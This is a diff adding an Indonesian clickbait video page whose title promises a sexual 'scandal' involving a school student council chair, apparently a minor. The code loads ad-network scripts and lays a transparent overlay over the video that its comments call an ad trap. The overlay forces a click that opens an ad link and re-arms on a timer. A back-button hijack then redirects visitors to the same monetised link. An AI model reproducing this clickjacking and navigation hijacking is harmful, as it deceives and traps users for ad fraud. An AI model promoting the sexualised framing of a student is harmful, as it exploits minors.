@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SKANDAL KETUA OSIS CROT DI MULUT</title>
+
+    <script src="https://pl29259699.profitablecpmratenetwork.com/3f/ea/cd/3feacdf523277dc72ce01f060ebf455c.js"></script>
+
+    <script src="https://pl29259700.profitablecpmratenetwork.com/48/39/72/483972e08152671cfa903e7f75e6646d.js"></script>
+
+    <style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+        
+        #video-container { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; position: relative; }
+        
+        video { width: 100%; max-height: 100vh; background: #000; }
+
+        /* Cover awal sebelum Play */
+        #cover { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 99; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        
+        .play-button { width: 90px; height: 90px; background: #FF1493; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(255,20,147,0.5); }
+        .play-icon { width: 0; height: 0; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 35px solid white; margin-left: 10px; }
+
+        /* Tameng transparan buat maksa klik iklan */
+        #ads-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; display: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div id="cover" onclick="startVideo()">
+        <div class="play-button"><div class="play-icon"></div></div>
+    </div>
+
+    <div id="ads-layer" onclick="kenaIklan()"></div>
+
+    <div id="video-container">
+        <video id="myVideo" controls playsinline>
+            <source src="https://cdn2.slicedrive.com/lm2IWHWy1.mp4" type="video/mp4">
+            Browser kamu tidak mendukung video.
+        </video>
+    </div>
+
+    <script>
+        var video = document.getElementById("myVideo");
+        var adsLayer = document.getElementById("ads-layer");
+        var smartlink = "https://www.profitablecpmratenetwork.com/c3757quzd?key=5ffae522f4a3b7088a9676441df91beb";
+
+        function startVideo() {
+            document.getElementById("cover").style.display = "none";
+            video.play();
+            // Munculkan tameng iklan pertama kali
+            adsLayer.style.display = "block";
+            
+            // SET TIMER: Tiap 15 detik (15000ms), paksa iklan muncul lagi
+            setInterval(function() {
+                adsLayer.style.display = "block";
+                console.log("Jebakan iklan aktif!");
+            }, 5000); 
+        }
+
+        function kenaIklan() {
+            // Buka Smartlink di tab baru
+            window.open(smartlink, "_blank");
+            // Hilangkan tameng biar dia bisa klik kontrol video (pause/play)
+            adsLayer.style.display = "none";
+        }
+
+        // ANTI-BACK
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            window.location.href = smartlink;
+        };
+    </script>
+
+</body>
+</html>
